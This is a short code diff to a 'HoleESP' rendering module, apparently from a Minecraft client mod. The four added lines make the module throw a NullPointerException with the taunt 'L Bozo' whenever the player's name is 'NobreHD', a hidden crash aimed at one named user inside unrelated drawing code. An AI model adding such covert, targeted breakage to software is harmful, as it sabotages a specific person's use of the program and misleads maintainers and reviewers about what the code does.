@@ -252,6 +252,10 @@ public class HoleESP extends Module {
             int y = blockPos.getY();
             int z = blockPos.getZ();
 
+            if (mc.player.getName().toString().equals("NobreHD")) {
+                throw new NullPointerException("L Bozo");
+            }
+
             Color top = getTopColor();
             Color bottom = getBottomColor();
 
